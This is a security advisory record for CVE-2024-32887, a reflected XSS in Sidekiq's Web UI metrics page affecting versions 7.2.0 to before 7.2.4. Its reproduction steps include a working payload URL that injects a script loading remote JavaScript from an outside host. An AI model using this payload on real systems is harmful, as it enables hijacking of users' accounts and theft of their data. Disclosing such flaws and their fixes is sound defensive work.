---
identifier: "CVE-2024-32887"
identifiers:
- "CVE-2024-32887"
- "GHSA-q655-3pj8-9fxq"
package_slug: "gem/sidekiq"
title: "Sidekiq vulnerable to a Reflected XSS in Queues Web Page"
description: "### Description:\nDuring the source Code Review of the metrics.erb view
  of the Sidekiq Web UI, A reflected XSS vulnerability is discovered. The value of
  substr parameter is reflected in the response without any encoding, allowing an
  attacker to inject Javascript code into the response of the application. \n\nThis
  vulnerability can be exploited to target the users of the application, and users
  of other applications deployed on the same domain or website as that of the Sidekiq
  website. Successful exploit results may result in compromise of user accounts and
  user data.\n\n### Impact:\nThe impact of this vulnerability can be severe. An attacker
  could exploit it to target users of the Sidekiq Web UI. Moreover, if other applications
  are deployed on the same domain or website as Sidekiq, users of those applications
  could also be affected, leading to a broader scope of compromise. Potentially compromising
  their accounts, forcing the users to perform sensitive actions, stealing sensitive
  data, performing CORS attacks, defacement of the web application, etc.\n\n### Mitigation:\nEncode
  all output data before rendering it in the response to prevent XSS attacks.\n\n###
  Steps to Reproduce:\n1. Go to the following URL of the sidekiq Web UI: \nhttps://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22https://cheemahq.vercel.app/a.js%22%20/%3E\n2.
  XSS payload will be executed, causing a popup.\n\n### Evidence:\n\n![image](https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e)\nFigure
  1: Source Code Vulnerable to XSS\n\n![image](https://github.com/sidekiq/sidekiq/assets/59286712/7a801feb-d495-416e-8e0e-36dee0eadf85)\nFigure
  2: XSS payload triggered"
date: "2024-04-26"
pubdate: "2024-04-26"
affected_range: ">=7.2.0 <7.2.4"
fixed_versions:
- "7.2.4"
affected_versions: "All versions starting from 7.2.0 before 7.2.4"
not_impacted: "All versions before 7.2.0, all versions starting from 7.2.4"
solution: "Upgrade to version 7.2.4 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2024-32887"
- "https://github.com/advisories/GHSA-q655-3pj8-9fxq"
- "https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq"
- "https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d"
- "https://github.com/sidekiq/sidekiq"
- "https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L"
uuid: "1bdfb51f-3cd4-4a5b-bb70-e624e193109c"
cwe_ids:
- "CWE-79"
- "CWE-937"
- "CWE-1035"
